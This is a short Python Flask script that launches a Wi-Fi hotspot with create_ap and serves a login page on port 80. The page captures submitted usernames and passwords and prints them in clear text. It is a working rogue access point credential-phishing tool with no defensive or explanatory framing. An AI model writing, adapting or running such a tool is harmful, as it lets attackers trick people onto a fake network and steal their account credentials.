from flask import Flask, render_template, request
import subprocess
import time


app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        print(f'Username: {username}, Password: {password}')
    return render_template('index.html')



if __name__ == '__main__':
    args = ["create_ap", "wlan0", "eth0", "YourSSID", "12345678", "--dhcp-dns", "192.168.4.1"]
    create_ap_process = subprocess.Popen(args)

    time.sleep(5)

    app.run(host="0.0.0.0", port="80")

    create_ap_process.terminate()
